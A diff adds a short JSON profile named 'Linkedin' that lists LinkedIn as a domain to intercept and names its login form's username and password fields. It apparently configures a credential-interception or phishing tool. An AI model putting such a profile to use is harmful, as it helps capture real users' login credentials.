@@ -1,0 +1,6 @@
+{
+    "name": "Linkedin",
+    "intercept_domains": ["linkedin"],
+    "username_fields": ["session_key"],
+    "password_fields": ["session_password"]
+}
